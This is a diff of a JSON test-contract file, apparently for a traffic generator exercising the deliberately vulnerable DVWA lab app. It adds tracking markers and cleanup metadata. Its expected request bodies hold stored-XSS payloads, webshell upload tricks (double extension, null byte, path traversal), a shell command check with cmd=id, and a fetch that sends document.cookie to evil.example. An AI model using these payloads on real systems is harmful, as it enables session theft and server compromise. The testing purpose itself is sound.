@@ -7490,7 +7490,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-php",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"dvwa-shell-[0-9]+\\.php\"[\\s\\S]*UPLOAD_SUCCESS",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-shell\\.php\"[\\s\\S]*UPLOAD_SUCCESS",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
@@ -7502,7 +7502,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-double-extension",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"dvwa-shell-[0-9]+\\.php\\.jpg\"[\\s\\S]*DOUBLE_EXT_SUCCESS",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-shell\\.php\\.jpg\"[\\s\\S]*DOUBLE_EXT_SUCCESS",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
@@ -7514,7 +7514,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-mime-spoof",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"dvwa-shell-mime-[0-9]+\\.php\"[\\s\\S]*MIME_SPOOF_SUCCESS",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-mime\\.php\"[\\s\\S]*MIME_SPOOF_SUCCESS",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
@@ -7526,16 +7526,47 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-null-byte",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"dvwa-shell-null-[0-9]+\\.php%00\\.jpg\"[\\s\\S]*NULL_BYTE_SUCCESS",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-null\\.php%00\\.jpg\"[\\s\\S]*NULL_BYTE_SUCCESS",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+          },
+          {
+            "id": "native-shell-execution",
+            "method": "GET",
+            "path_regex": "/dvwa/hackable/uploads/tgen-[a-f0-9]{32}-shell\\.php",
+            "query_values": {
+              "cmd": "id"
+            },
+            "payload_class": "owned-upload-execution",
+            "minimum_dispatches": 1,
+            "expected_statuses": [200, 404],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["UPLOAD_SUCCESS", "uid="]
+              },
+              "404": {
+                "content_type": "text/html",
+                "text_contains": ["Not Found", "The requested URL was not found"]
+              }
+            }
           }
         ],
         "reject_unmatched_errors": true
       },
-      "fixture_refresh": []
+      "fixture_refresh": [],
+      "adapter": "native-family-journal",
+      "fixture_contract": {
+        "family_restore": "dvwa"
+      },
+      "functional_contract": {
+        "verifier": "composed-native",
+        "behavior": "Preserved native payloads require application-specific protocol content or exact protection attribution; the host journal removes only marker-owned guestbook rows and exact upload payload hashes on four replicas",
+        "mutation_policy": "journaled-restoration",
+        "restoration_fields": ["family_restoration"]
+      }
     },
     {
       "id": "dvwa-exploits/06-sqli",
@@ -8123,11 +8154,17 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_regex": "txtName=TestXSS1\\&mtxMessage=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "body_regex": "txtName=TestXSS1\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cscript%3Ealert%281%29%3C%2Fscript%3E&btnSign=Sign\\+Guestbook&user_token=",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "<script>alert(1)</script>"]
+              }
+            }
           },
           {
             "id": "stored-1",
@@ -8135,11 +8172,17 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_regex": "txtName=TestXSS2\\&mtxMessage=%3Cimg\\+src%3Dx\\+onerror%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "body_regex": "txtName=TestXSS2\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cimg\\+src%3Dx\\+onerror%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "<img src=x onerror=alert(1)>"]
+              }
+            }
           },
           {
             "id": "stored-2",
@@ -8147,11 +8190,17 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_regex": "txtName=%3Cscript%3Ealert%28%27name%27%29%3C%2Fscript%3E\\&mtxMessage=Normal\\+message\\+with\\+XSS\\+name&btnSign=Sign\\+Guestbook&user_token=",
+            "body_regex": "txtName=%3Cscript%3Ealert%28%27name%27%29%3C%2Fscript%3E\\&mtxMessage=tgen-[a-f0-9]{32}%3ANormal\\+message\\+with\\+XSS\\+name&btnSign=Sign\\+Guestbook&user_token=",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "<script>alert('name')</script>"]
+              }
+            }
           },
           {
             "id": "stored-3",
@@ -8159,11 +8208,17 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_regex": "txtName=TestXSS4\\&mtxMessage=%3Csvg\\+onload%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "body_regex": "txtName=TestXSS4\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Csvg\\+onload%3Dalert%281%29%3E&btnSign=Sign\\+Guestbook&user_token=",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "<svg onload=alert(1)>"]
+              }
+            }
           },
           {
             "id": "stored-4",
@@ -8171,11 +8226,17 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_regex": "txtName=TestXSS5\\&mtxMessage=%3Ca\\+href%3Djavascript%3Aalert%281%29%3Eclickme%3C%2Fa%3E&btnSign=Sign\\+Guestbook&user_token=",
+            "body_regex": "txtName=TestXSS5\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Ca\\+href%3Djavascript%3Aalert%281%29%3Eclickme%3C%2Fa%3E&btnSign=Sign\\+Guestbook&user_token=",
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "javascript:alert(1)"]
+              }
+            }
           },
           {
             "id": "persistence",
@@ -8186,12 +8247,28 @@
             "header_regex": {
               "cookie": "PHPSESSID=.+"
             },
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "response_contract_by_status": {
+              "200": {
+                "content_type": "text/html",
+                "text_contains": ["DVWA", "Guestbook"]
+              }
+            }
           }
         ],
         "reject_unmatched_errors": true
       },
-      "fixture_refresh": []
+      "fixture_refresh": [],
+      "adapter": "native-family-journal",
+      "fixture_contract": {
+        "family_restore": "dvwa"
+      },
+      "functional_contract": {
+        "verifier": "composed-native",
+        "behavior": "Preserved native payloads require application-specific protocol content or exact protection attribution; the host journal removes only marker-owned guestbook rows and exact upload payload hashes on four replicas",
+        "mutation_policy": "journaled-restoration",
+        "restoration_fields": ["family_restoration"]
+      }
     },
     {
       "id": "dvwa-exploits/11-csp-bypass",
@@ -27229,8 +27306,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-1-target-0",
@@ -27260,8 +27337,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-2-target-0",
@@ -27291,8 +27368,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Csvg%20onload%3Dalert%281%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Csvg%20onload%3Dalert%281%29%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-3-target-0",
@@ -27322,8 +27399,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cbody%20onload%3Dalert%281%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cbody%20onload%3Dalert%281%29%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-4-target-0",
@@ -27353,8 +27430,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%22%3E%3Cscript%3Ealert%28document\\.cookie%29%3C/script%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-5-target-0",
@@ -27384,8 +27461,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=javascript%3Aalert%28%27XSS%27%29&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3Ajavascript%3Aalert%28%27XSS%27%29\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-6-target-0",
@@ -27415,8 +27492,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-7-target-0",
@@ -27446,8 +27523,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-8-target-0",
@@ -27477,8 +27554,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cmarquee%20onstart%3Dalert%281%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cmarquee%20onstart%3Dalert%281%29%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-9-target-0",
@@ -27508,8 +27585,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-10-target-0",
@@ -27539,8 +27616,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%3Csvg%3E%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C/script%3E%3C/svg%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%3Csvg%3E%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C/script%3E%3C/svg%3E\\&btnSign=Sign\\+Guestbook"
           },
           {
             "id": "payload-11-target-0",
@@ -27570,8 +27647,8 @@
             "path": "/dvwa/vulnerabilities/xss_s/",
             "payload_class": "stored-xss",
             "minimum_dispatches": 1,
-            "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22https%3A//evil.example/steal%3Fc%3D%22%2Bdocument.cookie%29%3E&btnSign=Sign+Guestbook",
-            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
+            "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422],
+            "body_regex": "txtName=attacker\\&mtxMessage=tgen-[a-f0-9]{32}%3A%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22https%3A//evil\\.example/steal%3Fc%3D%22%2Bdocument\\.cookie%29%3E\\&btnSign=Sign\\+Guestbook"
           }
         ],
         "reject_unmatched_errors": true
@@ -27586,7 +27663,17 @@
           }
         ]
       },
-      "fixture_refresh": []
+      "fixture_refresh": [],
+      "adapter": "native-family-journal",
+      "fixture_contract": {
+        "family_restore": "dvwa"
+      },
+      "functional_contract": {
+        "verifier": "composed-native",
+        "behavior": "Preserved native payloads require application-specific protocol content or exact protection attribution; the host journal removes only marker-owned guestbook rows and exact upload payload hashes on four replicas",
+        "mutation_policy": "journaled-restoration",
+        "restoration_fields": ["family_restoration"]
+      }
     },
     {
       "id": "web-app-attacks/03-command-injection",
@@ -29527,7 +29614,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"avatar\\.jpg\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-avatar\\.jpg\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29539,7 +29626,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"shell\\.php\\.jpg\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-double\\.php\\.jpg\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29551,7 +29638,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"webshell\\.php\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-webshell\\.php\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29563,7 +29650,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"bigfile\\.bin\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-bigfile\\.bin\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29575,7 +29662,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"image\\.svg\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-image\\.svg\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29587,7 +29674,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"page\\.html\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-page\\.html\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29599,7 +29686,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"\\.\\./\\.\\./shell\\.php\"",
+            "body_regex": "filename=\"\\.\\./\\.\\./tgen-[a-f0-9]{32}-traversal\\.php\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29611,7 +29698,7 @@
             "path": "/dvwa/vulnerabilities/upload/",
             "payload_class": "multipart-upload",
             "minimum_dispatches": 1,
-            "body_regex": "filename=\"shell\\.php%00\\.jpg\"",
+            "body_regex": "filename=\"tgen-[a-f0-9]{32}-webnull\\.php%00\\.jpg\"",
             "header_regex": {
               "content-type": "multipart/form-data; boundary=.+"
             },
@@ -29620,7 +29707,17 @@
         ],
         "reject_unmatched_errors": true
       },
-      "fixture_refresh": []
+      "fixture_refresh": [],
+      "adapter": "native-family-journal",
+      "fixture_contract": {
+        "family_restore": "dvwa"
+      },
+      "functional_contract": {
+        "verifier": "composed-native",
+        "behavior": "Preserved native payloads require application-specific protocol content or exact protection attribution; the host journal removes only marker-owned guestbook rows and exact upload payload hashes on four replicas",
+        "mutation_policy": "journaled-restoration",
+        "restoration_fields": ["family_restoration"]
+      }
     },
     {
       "id": "mitre-attack/08-attck-coverage-report",
